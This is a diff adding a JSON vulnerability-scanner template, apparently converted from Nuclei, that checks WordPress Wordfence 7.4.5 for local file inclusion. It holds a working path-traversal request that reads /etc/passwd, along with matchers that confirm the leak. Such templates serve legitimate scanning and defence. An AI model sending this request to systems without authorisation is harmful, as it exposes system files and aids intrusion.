@@ -1,0 +1,148 @@
+{
+  "id": "wordpress-wordfence-lfi",
+  "name": "WordPress Wordfence 7.4.5 - Local File Inclusion",
+  "author": "0x_Akoko",
+  "severity": "HIGH",
+  "description": "WordPress Wordfence 7.4.5 is vulnerable to local file inclusion.",
+  "references": [
+    "https://www.exploit-db.com/exploits/48061",
+    "https://www.nmmapper.com/st/exploitdetails/48061/42367/wordpress-plugin-wordfence745-local-file-disclosure/"
+  ],
+  "tags": [
+    "wordpress",
+    "wp-plugin",
+    "lfi",
+    "wordfence",
+    "edb"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {},
+  "variables": {},
+  "variablesType": "sniper",
+  "cweId": "CWE-22",
+  "cvssScore": "7.5",
+  "cvssMetrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "method": "GET",
+      "path": "{{BaseURL}}/wp-content/plugins/wordfence/lib/wordfenceClass.php?file\u003d/../../../../../../etc/passwd",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "REGEX",
+          "part": "body",
+          "values": [
+            "root:.*:0:0:"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "internal": "true",
+          "group": 1
+        },
+        {
+          "type": "STATUS",
+          "values": [
+            "200"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "wordpress-wordfence-lfi",
+    "info": {
+      "name": "WordPress Wordfence 7.4.5 - Local File Inclusion",
+      "author": "0x_Akoko",
+      "severity": "high",
+      "description": "WordPress Wordfence 7.4.5 is vulnerable to local file inclusion.",
+      "reference": [
+        "https://www.exploit-db.com/exploits/48061",
+        "https://www.nmmapper.com/st/exploitdetails/48061/42367/wordpress-plugin-wordfence745-local-file-disclosure/"
+      ],
+      "classification": {
+        "cvss_metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+        "cvss_score": "7.5",
+        "cwe_id": "CWE-22"
+      },
+      "metadata": {
+        "max_request": 1
+      },
+      "tags": "wordpress,wp-plugin,lfi,wordfence,edb"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "method": "GET",
+        "redirects": false,
+        "path": [
+          "{{BaseURL}}/wp-content/plugins/wordfence/lib/wordfenceClass.php?file\u003d/../../../../../../etc/passwd"
+        ],
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "regex",
+            "part": "body",
+            "regex": [
+              "root:.*:0:0:"
+            ],
+            "group": 1,
+            "internal": true
+          },
+          {
+            "type": "status",
+            "status": [
+              200
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
